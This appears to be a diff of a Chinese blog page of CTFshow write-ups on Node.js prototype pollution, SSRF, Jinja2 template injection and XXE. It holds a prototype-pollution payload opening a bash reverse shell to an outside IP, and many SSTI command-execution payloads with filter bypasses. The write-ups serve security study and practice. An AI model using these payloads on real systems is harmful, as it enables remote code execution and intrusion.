class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>api.js</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);  <span class="comment">//函数名query，参数query</span></span><br><span class="line">   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>和上一题的区别在于，上一题判断语句是if(secert.ctfshow&#x3D; &#x3D; &#x3D;‘36dboy’)，这题是if(secert.ctfshow&#x3D; &#x3D; &#x3D;flag)，但是变量flag的值我们不知道，所以不能使用上一题的payload污染原型修改secert.ctfshow。</p>
+<p>通过 login.js 里的 utils.copy(user,req.body); 污染原型，然后访问 api 的时候由于 query未定义，所以会向其原型找，那么通过污染原型构造恶意代码即可rce。</p>
+<p>![img](file:&#x2F;&#x2F;&#x2F;C:\Users\111\Documents\Tencent Files\2645958615\nt_qq\nt_data\Pic\2025-05\Ori\be7268db2dea4a7ca61ae7aebefabd9c.png)</p>
+<h3 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h3><p>这一题从userinfo对象进行污染，userinfo对象上一级是user对象，user对象上一级就是object，所以需要污染两次。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/120.46.41.173/9023 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>记得POST发包调成json格式。</p>
+<p>环境变量中找到flag</p>
 <h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>url &#x3D; <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a><br>url &#x3D; localhost&#x2F;flag.php<br>url &#x3D; 127.0.0.1&#x2F;flag.php</p>
@@ -972,6 +1162,51 @@
 <h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123;</span><br><span class="line">    echo file_get_contents($url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><code>url=http://ctf.:passwd@127.0.0.1/flag.php#show</code></p>
+<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><p>![img](file:&#x2F;&#x2F;&#x2F;C:\Users\111\Documents\Tencent Files\2645958615\nt_qq\nt_data\Pic\2025-04\Ori\250ea6921f44142c235ad251ca163526.png)</p>
+<h3 id="web362-过滤部分数字"><a href="#web362-过滤部分数字" class="headerlink" title="web362 过滤部分数字"></a>web362 过滤部分数字</h3><p>这个题是屏蔽了数字 2 和 3，那么思路可以分为两类，硬要用 os 类那就绕过 2 和 3，或者用其他的类。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[11*11%2b+11].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat+/flag&#x27;).read()&#125;&#125;</span><br><span class="line">用&lt;class &#x27;warnings.catch_warnings&#x27;&gt;  执行命令：</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">用 subprocess.Popen()：</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[407](&quot;cat /flag&quot;,shell=True,stdout=-1).communicate()[0]&#125;&#125;</span><br><span class="line">使用_frozen_importlib_external.FileLoader 进行读取 flag 内容：</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[94].get_data(0,&#x27;/flag&#x27;)&#125;&#125;</span><br><span class="line">                                                         文件路径</span><br><span class="line">使用 lipsum 方法。这个是 flask 的内置方法，自带 os 模块：             </span><br><span class="line">&#123;&#123;lipsum.__globals__.get(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web363-单双引号””‘’"><a href="#web363-单双引号””‘’" class="headerlink" title="web363 单双引号””‘’"></a>web363 单双引号””‘’</h3><p>过滤了单引号，把””变成（）,用 request.args.a</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[11*11%2b+11].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="web364-args"><a href="#web364-args" class="headerlink" title="web364 args"></a>web364 args</h3><p>过滤 args，可以用 cookies</p>
+<blockquote>
+<p>过滤 args，可以用 cookies<br><code>?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.cookies.p](request.cookies.param).read()&#125;&#125;</code><br>cookies<br><code>Cookie: p=popen; param=cat /flag</code></p>
+</blockquote>
+<p>request.values.a 读取 get&#x2F;post 方式里 a 的值</p>
+<p>request.args.a 读取 get 方式里 a 的值</p>
+<p>request.form.a 读取 post 方式里 a 的值</p>
+<p>request.cookies.a 读取 cookie 里 a 的值</p>
+<h3 id="web365-方括号"><a href="#web365-方括号" class="headerlink" title="web365 方括号[]"></a>web365 方括号[]</h3><blockquote>
+<p>过滤了方括号，可以用__getitem__绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure></blockquote>
+<blockquote>
+<p>三种方法，但都需要用到 python 魔术方法 getitem</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方法一：&#123;%set char=config.**class**.**init**.**globals**.**builtins**.chr%&#125;&#123;&#123;().**class**.**base**.**subclasses**().**getitem**(132).**init**.**globals**.popen(char(108)%2bchar(115)).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">方法二： name=&#123;&#123;().class.base.subclasses().getitem(132).init.globals.getitem(request.cookies.x1)(request.cookies.x2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">然后将 cookie 写入 Cookie: x1=popen; x2=cat /flag</span><br><span class="line"></span><br><span class="line">方法三： 使用 subprocess.Popen 类 &#123;&#123;().**class**.**mro**.**getitem**(1).**subclasses**().**getitem**(407)(request.values.a,shell=True,stdout=-1).communicate().**getitem**(0)&#125;&#125;&amp;a=cat /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>
+<h3 id="web366-下划线"><a href="#web366-下划线" class="headerlink" title="web366 下划线_"></a>web366 下划线_</h3><blockquote>
+<p>过滤了下划线，先换一个更简单获取 popen 方法的类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.a).read()&#125;&#125;&amp;a =cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>再利用 filters 中的 attr 来过滤下划</p>
+<p>具体介绍可以看一下官方文档 <a href="https://jinja.palletsprojects.com/en/2.11.x/templates/#attr">https://jinja.palletsprojects.com/en/2.11.x/templates/#attr</a></p>
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure></blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 `?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__` 这个恶意 payload 里：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`lipsum` 是一个对象，`request.values.b` 的值为 `&quot;__globals__&quot;` ，`attr(request.values.b)` （等价于 `attr(&quot;__globals__&quot;)` ）表示通过 `attr` 操作（类似 `getattr` 函数）去获取 `lipsum` 对象的 `__globals__` 属性。这里的 `|` 是模板引擎（比如 Jinja2 模板引擎）里的过滤器操作符，`lipsum | attr(request.values.b)` 就是对 `lipsum` 对象应用 `attr` 过滤器（本质是调用类似 `getattr` 这样获取属性的操作）来得到 `lipsum` 对象的 `__globals__` 属性值，它是一个包含了全局变量的字典。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后 `(lipsum | attr(request.values.b)).os` 是从这个 `__globals__` 字典里取出 `os` 模块对象（因为 `os` 模块通常会被包含在 `__globals__` 里） ，接着 `(lipsum | attr(request.values.b)).os.popen(request.values.a)` 调用 `os` 模块的 `popen` 函数去执行 `request.values.a` 所传入的命令（这里是 `cat /flag` ），最后 `.read()` 读取命令执行的输出结果。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`__globals__` 是 Python 中对象的一个特殊属性（属性名是固定的 `__globals__` ），而 `globals` 是 Python 内置函数，功能是返回当前全局符号表的字典。两者概念不同，并且在这个恶意 payload 里主要是获取对象的 `__globals__` 属性来达到恶意利用 `os` 模块执行命令的目的。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web367-os"><a href="#web367-os" class="headerlink" title="web367 os"></a>web367 os</h3><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤了 os，可以通过 get 来获取</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure></blockquote>
+<h3 id="web368-request"><a href="#web368-request" class="headerlink" title="web368 request"></a>web368 request</h3><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤了 request，但是是再&#123;&#123;&#125;&#125;中过滤了 request，没有在&#123;% %&#125;过滤 request</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure></blockquote>
+<h3 id="web369-request"><a href="#web369-request" class="headerlink" title="web369 request"></a>web369 request</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
 <h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="comment"># php://input 是 PHP 中用于直接读取 HTTP 请求体（Request Body） 的流。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="comment"># 允许加载并解析外部实体和 DTD，直接触发 XXE。</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>打开 bp 抓包，修改请求方法，</p>
